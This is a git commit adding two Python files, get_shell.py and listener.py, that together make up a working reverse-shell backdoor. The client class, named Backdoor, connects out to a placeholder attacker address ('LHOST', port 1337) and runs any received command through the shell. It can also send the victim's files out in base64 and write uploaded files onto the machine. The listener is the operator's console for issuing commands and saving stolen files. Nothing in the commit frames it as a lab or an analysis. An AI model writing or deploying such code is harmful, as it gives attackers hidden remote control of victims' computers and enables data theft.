b9c262c17420f8bf2e5192d76a520183be4e3839
itsoktocryy <73375576+itsoktocryy@users.noreply.github.com>
2023-06-02 18:52:42 +0200

    Add files via upload

---
+++ get_shell.py
@@ -0,0 +1,75 @@
+import socket
+import json
+import subprocess
+import os
+import base64
+
+class Backdoor:
+    def __init__(self, ip, port):
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connection.connect((ip, port))
+
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data.encode())
+
+    def reliable_receive(self):
+        json_data = b""
+        while True:
+            try:
+                received_data = self.connection.recv(1024)
+                if not received_data:
+                    break
+                json_data += received_data
+                return json.loads(json_data.decode())
+            except ValueError:
+                return "[-] Error during command execution."
+
+    def execute_system_command(self, command):
+        try:
+            result = subprocess.check_output(command, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            return result.decode()
+        except subprocess.CalledProcessError as e:
+            return str(e.stderr.decode())
+
+    def change_directory(self, path):
+        try:
+            os.chdir(path)
+            return "[+] Changing working directory to " + os.getcwd()
+        except FileNotFoundError:
+            return "[-] Directory not found: " + path
+
+    def read_file(self, path):
+        with open(path, "rb") as f:
+            return base64.b64encode(f.read()).decode()
+
+    def write_file(self, path, content):
+        with open(path, "wb") as file:
+            file.write(base64.b64decode(content))
+        return "[+] Upload successful."
+
+    def run(self):
+        while True:
+            command = str(self.reliable_receive())
+            command = command.split()
+            try:
+                if command[0] == "exit":
+                    print("exit")
+                    self.connection.close()
+                    exit()
+                elif command[0] == "cd" and len(command) > 1:
+                    command_result = self.change_directory(command[1])
+                elif command[0] == "download":
+                    command_result = self.read_file(command[1])
+                elif command[0] == "upload":
+                    command_result = self.write_file(command[1], " ".join(command[2:]))
+                else:
+                    command_result = self.execute_system_command(command)
+            except Exception:
+                command_result = "[-] Error during command execution."
+
+            print(command_result)
+            self.reliable_send(command_result)
+
+my_backdoor = Backdoor("LHOST", 1337)
+my_backdoor.run()
---
+++ listener.py
@@ -0,0 +1,69 @@
+import socket
+import json
+import base64
+
+class Listener:
+    def __init__(self, ip, port):
+        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.listener.bind((ip, port))
+        self.listener.listen(1)
+        print("[+] Waiting for incoming connections")
+        self.connection, address = self.listener.accept()
+        print("[+] Got a connection from " + str(address))
+
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data.encode())
+
+    def reliable_receive(self):
+        json_data = b""
+        while True:
+            try:
+                json_data += self.connection.recv(1024)
+                return json.loads(json_data.decode())
+            except ValueError:
+                continue
+
+    def execute_remotely(self, command):
+        self.reliable_send(command)
+        return self.reliable_receive()
+
+    def write_file(self, path, content):
+        with open(path, "wb") as file:
+            decoded_content = base64.b64decode(content)
+            file.write(decoded_content)
+        print("[+] Upload successful")
+
+    def read_file(self, path):
+        with open(path, "rb") as f:
+            return base64.b64encode(f.read()).decode()
+
+    def run(self):
+        while True:
+            command = input(">:) ")
+            try:
+                if command == "exit":
+                    break
+                elif command.split()[0] == "download":
+                    result = self.execute_remotely(command)
+                    if "[-] Error" not in result:
+                        filename = command.split()[1]
+                        self.write_file(filename, result)
+                        print("[+] File Downloaded as " + filename)
+                        print("-> Content : " + result)
+                    else:
+                        print(result)
+                elif command.split()[0] == "upload":
+                    file_path = command.split()[1]
+                    file_content = self.read_file(file_path)
+                    result = self.execute_remotely(command + " " + file_content)
+                    print(result)
+                else:
+                    result = self.execute_remotely(command)
+                    print(result)
+            except Exception as e:
+                print("[-] Error during command execution:", str(e))
+
+my_listener = Listener("0.0.0.0", 1337)
+my_listener.run()
